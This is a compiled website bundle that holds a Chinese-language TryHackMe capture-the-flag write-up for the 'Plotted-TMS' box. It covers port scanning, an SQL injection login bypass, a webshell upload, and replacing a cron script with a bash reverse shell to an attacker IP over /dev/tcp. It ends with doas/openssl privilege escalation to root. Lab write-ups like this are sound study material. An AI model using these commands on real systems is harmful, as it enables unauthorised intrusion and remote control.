"use strict";(self.webpackChunkguardian_jtz_github_io=self.webpackChunkguardian_jtz_github_io||[]).push([[3003],{8083:(t,n,e)=>{e.r(n),e.d(n,{assets:()=>l,contentTitle:()=>i,default:()=>p,frontMatter:()=>s,metadata:()=>o,toc:()=>c});var a=e(74848),r=e(28453);const s={sidebar_position:60,tags:["Easy","Linux","SQLI","\u6587\u4ef6\u4e0a\u4f20","\u5b9a\u65f6\u4efb\u52a1","SUID"],title:"Plotted-TMS",description:"Plotted-TMS",sidebar_label:"Plotted-TMS",slug:"/tryhackme/60"},i="Plotted-TMS",o={id:"box/TryHackMe/60",title:"Plotted-TMS",description:"Plotted-TMS",source:"@site/docs/box/TryHackMe/60.md",sourceDirName:"box/TryHackMe",slug:"/tryhackme/60",permalink:"/docs/tryhackme/60",draft:!1,unlisted:!1,tags:[{label:"Easy",permalink:"/docs/tags/easy"},{label:"Linux",permalink:"/docs/tags/linux"},{label:"SQLI",permalink:"/docs/tags/sqli"},{label:"\u6587\u4ef6\u4e0a\u4f20",permalink:"/docs/tags/\u6587\u4ef6\u4e0a\u4f20"},{label:"\u5b9a\u65f6\u4efb\u52a1",permalink:"/docs/tags/\u5b9a\u65f6\u4efb\u52a1"},{label:"SUID",permalink:"/docs/tags/suid"}],version:"current",sidebarPosition:60,frontMatter:{sidebar_position:60,tags:["Easy","Linux","SQLI","\u6587\u4ef6\u4e0a\u4f20","\u5b9a\u65f6\u4efb\u52a1","SUID"],title:"Plotted-TMS",description:"Plotted-TMS",sidebar_label:"Plotted-TMS",slug:"/tryhackme/60"},sidebar:"boxSidebar",previous:{title:"Cat Pictures",permalink:"/docs/tryhackme/59"},next:{title:"GLITCH",permalink:"/docs/tryhackme/61"}},l={},c=[{value:"\u7aef\u53e3\u626b\u63cf",id:"\u7aef\u53e3\u626b\u63cf",level:2},{value:"80",id:"80",level:2},{value:"139/445",id:"139445",level:2},{value:"\u540e\u6e17\u900f",id:"\u540e\u6e17\u900f",level:2},{value:"www-data",id:"www-data",level:3},{value:"www-data --&gt; plot_admin",id:"www-data----plot_admin",level:3},{value:"plot_admin \u2014&gt; root",id:"plot_admin--root",level:3}];function d(t){const n={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",...(0,r.R)(),...t.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(n.h1,{id:"plotted-tms",children:"Plotted-TMS"}),"\n",(0,a.jsx)(n.h2,{id:"\u7aef\u53e3\u626b\u63cf",children:"\u7aef\u53e3\u626b\u63cf"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"root@ip-10-10-24-143:~# nmap -sTCV -p 22,80,445 --min-rate 1000 10.10.106.11\n\nStarting Nmap 7.60 ( https://nmap.org ) at 2023-09-03 14:40 BST\nNmap scan report for ip-10-10-106-11.eu-west-1.compute.internal (10.10.106.11)\nHost is up (0.00013s latency).\n\nPORT    STATE SERVICE VERSION\n22/tcp  open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n80/tcp  open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: Apache2 Ubuntu Default Page: It works\n445/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: Apache2 Ubuntu Default Page: It works\nMAC Address: 02:2A:86:EA:56:C9 (Unknown)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n|_smb2-time: Protocol negotiation failed (SMB2)\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 118.32 seconds\n"})}),"\n",(0,a.jsx)(n.h2,{id:"80",children:"80"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240702230128.png",alt:"20240702230128"})}),"\n",(0,a.jsx)(n.p,{children:"\u67e5\u770b\u626b\u63cf\u51fa\u7684\u6587\u4ef6, \u6bcf\u4e2a\u90fd\u63d0\u4f9b\u4e86\u4e00\u4e2a Base64 \u52a0\u5bc6\u5185\u5bb9"}),"\n",(0,a.jsx)(n.h2,{id:"139445",children:"139/445"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240702230145.png",alt:"20240702230145"})}),"\n",(0,a.jsx)(n.p,{children:"\u67e5\u770b\u8fd9\u4e2a\u9875\u9762, \u6211\u53d1\u73b0\u4e86\u4e00\u4e2a login \u754c\u9762, \u63a5\u7740\u6211\u8fdb\u884c\u67e5\u770b\u53d1\u73b0\u5b83\u5b58\u5728 SQL \u6ce8\u5165"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240702230246.png",alt:"20240702230246"})}),"\n",(0,a.jsx)(n.p,{children:"\u4f7f\u7528\u4e07\u80fd\u5bc6\u7801\u767b\u9646\u5373\u53ef, \u767b\u9646\u4e4b\u540e\u6211\u53d1\u73b0\u5728\u7528\u6237\u8d26\u6237\u754c\u9762\u5b58\u5728\u6587\u4ef6\u4e0a\u4f20\u4f4d\u7f6e, \u6240\u4ee5\u53ef\u4ee5\u5c1d\u8bd5\u5728\u6b64\u4e0a\u4f20\u4e00\u4e2a WebShell \u4e0a\u53bb"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240702230300.png",alt:"20240702230300"})}),"\n",(0,a.jsx)(n.h2,{id:"\u540e\u6e17\u900f",children:"\u540e\u6e17\u900f"}),"\n",(0,a.jsx)(n.h3,{id:"www-data",children:"www-data"}),"\n",(0,a.jsx)(n.p,{children:"\u8bbf\u95ee\u4e0a\u4f20\u7684 webShell  \u6211\u4eec\u5c31\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2a webShell"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240702230319.png",alt:"20240702230319"})}),"\n",(0,a.jsx)(n.h3,{id:"www-data----plot_admin",children:"www-data --\x3e plot_admin"}),"\n",(0,a.jsx)(n.p,{children:"\u6211\u53d1\u73b0 plot_admin \u7528\u6237\u5b58\u5728\u4e00\u4e2a\u5b9a\u65f6\u4efb\u52a1, \u800c\u5b9a\u65f6\u4efb\u52a1\u6267\u884c\u7684\u90a3\u4e2a\u811a\u672c\u6587\u4ef6\u5939\u53ef\u4ee5\u88ab\u6211\u4eec\u6240\u63a7\u5236, \u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5c06\u5176\u8fdb\u884c\u8986\u76d6\u4ee5\u83b7\u5f97 plot_admin \u7684 Shell"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"(remote) www-data@plotted:/$ cat /etc/crontab\n# /etc/crontab: system-wide crontab\n# Unlike any other crontab you don't have to run the `crontab'\n# command to install the new version when you edit this file\n# and files in /etc/cron.d. These files also have username fields,\n# that none of the other crontabs do.\n\nSHELL=/bin/sh\nPATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin\n\n# Example of job definition:\n# .---------------- minute (0 - 59)\n# |  .------------- hour (0 - 23)\n# |  |  .---------- day of month (1 - 31)\n# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...\n# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat\n# |  |  |  |  |\n# *  *  *  *  * user-name command to be executed\n17 *\t* * *\troot    cd / && run-parts --report /etc/cron.hourly\n25 6\t* * *\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )\n47 6\t* * 7\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )\n52 6\t1 * *\troot\ttest -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )\n* * \t* * *\tplot_admin /var/www/scripts/backup.sh\n#\n(remote) www-data@plotted:/$ ls -al /var/www/scripts/backup.sh\n-rwxrwxr-- 1 plot_admin plot_admin 141 Oct 28  2021 /var/www/scripts/backup.sh\n(remote) www-data@plotted:/var/www/scripts$ ls -al\ntotal 12\ndrwxr-xr-x 2 www-data   www-data   4096 Oct 28  2021 .\ndrwxr-xr-x 4 root       root       4096 Oct 28  2021 ..\n-rwxrwxr-- 1 plot_admin plot_admin  141 Oct 28  2021 backup.sh\n(remote) www-data@plotted:/var/www/scripts$ rm -rf backup.sh \n(remote) www-data@plotted:/var/www/scripts$ cat << EOF > backup.sh\n> #!/bin/bash\n> /bin/bash -i >& /dev/tcp/10.10.155.187/4445 0>&1\n> EOF\n(remote) www-data@plotted:/var/www/scripts$ cat backup.sh \n#!/bin/bash\n/bin/bash -i >& /dev/tcp/10.10.155.187/4445 0>&1\n(remote) www-data@plotted:/var/www/scripts$ chmod 777 backup.sh \n(remote) www-data@plotted:/var/www/scripts$ ls -al\ntotal 12\ndrwxr-xr-x 2 www-data www-data 4096 Sep  4 00:43 .\ndrwxr-xr-x 4 root     root     4096 Oct 28  2021 ..\n-rwxrwxrwx 1 www-data www-data   61 Sep  4 00:43 backup.sh\n"})}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240702230342.png",alt:"20240702230342"})}),"\n",(0,a.jsx)(n.h3,{id:"plot_admin--root",children:"plot_admin \u2014> root"}),"\n",(0,a.jsx)(n.p,{children:"\u5728\u679a\u4e3e SUID \u7a0b\u5e8f\u65f6 \u6211\u53d1\u73b0\u4e00\u4e2a\u7279\u6b8a\u7684\u5e94\u7528\u7a0b\u5e8f"}),"\n",(0,a.jsx)("div",{style:{textAlign:"center"},children:(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240702230410.png",alt:"20240702230410"})})}),"\n",(0,a.jsx)(n.p,{children:"\u8fd9\u4e2a\u7a0b\u5e8f\u53ef\u4ee5\u5b9e\u73b0\u7c7b\u4f3c\u4e8e sudo \u7684\u529f\u80fd, \u5728\u8be2\u95ee GPT \u540e\u6211\u53d1\u73b0\u53ef\u4ee5\u5229\u7528\u7684\u65b9\u6cd5"}),"\n",(0,a.jsxs)(n.ol,{children:["\n",(0,a.jsxs)(n.li,{children:["\u67e5\u770b doas \u914d\u7f6e\u6587\u4ef6, \u901a\u5e38\u662f ",(0,a.jsx)(n.code,{children:"/etc/doas.conf"})," \u4f4d\u7f6e, \u8fd9\u8868\u660e\u53ef\u4ee5\u5728 plot_admin \u7528\u6237\u4e0b, \u4f7f\u7528 root \u6267\u884c openssl \u7a0b\u5e8f\n",(0,a.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240702230541.png",alt:"20240702230541"})]}),"\n",(0,a.jsxs)(n.li,{children:["\u63a5\u7740\u6211\u67e5\u627e\u5bf9\u4e8e openssl \u7684\u4f7f\u7528 ",(0,a.jsx)(n.a,{href:"https://gtfobins.github.io/gtfobins/openssl/#file-read",children:"openssl"})]}),"\n",(0,a.jsxs)(n.li,{children:["\u6267\u884c\u7a0b\u5e8f\u8fdb\u884c\u8bfb\u53d6\n",(0,a.jsx)(n.img,{src:"https://raw.githubusercontent.com/Guardian-JTZ/Image/main/img/20240702230516.png",alt:"20240702230516"})]}),"\n"]})]})}function p(t={}){const{wrapper:n}={...(0,r.R)(),...t.components};return n?(0,a.jsx)(n,{...t,children:(0,a.jsx)(d,{...t})}):d(t)}},28453:(t,n,e)=>{e.d(n,{R:()=>i,x:()=>o});var a=e(96540);const r={},s=a.createContext(r);function i(t){const n=a.useContext(s);return a.useMemo((function(){return"function"==typeof t?t(n):{...n,...t}}),[n,t])}function o(t){let n;return n=t.disableParentContext?"function"==typeof t.components?t.components(r):t.components||r:i(t.components),a.createElement(s.Provider,{value:n},t.children)}}}]);